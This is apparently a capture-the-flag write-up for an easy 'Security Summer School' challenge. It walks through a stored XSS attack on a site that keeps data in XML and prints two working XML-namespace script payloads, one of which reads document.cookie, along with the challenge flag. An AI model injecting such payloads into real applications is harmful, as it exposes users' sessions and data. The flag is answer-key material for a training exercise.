---
Name: "Miami disco"
Category: "Security Summer School"
Difficulty: "Easy"
Description: "Delivering a stored XSS payload through XML-backed application data."
---

# Miami disco
The webiste stored data in an XML file, after searching xml xss payloads we find
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/Files/xss.xml
```

The payload is
```xml
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
```

But it's too long so we make it
```xml
<test:script xmlns:test="http://www.w3.org/1999/xhtml">alert(document.cookie)</test:script>
```

And we get the flag

```txt
SSS{miami_hot_number}
```

---

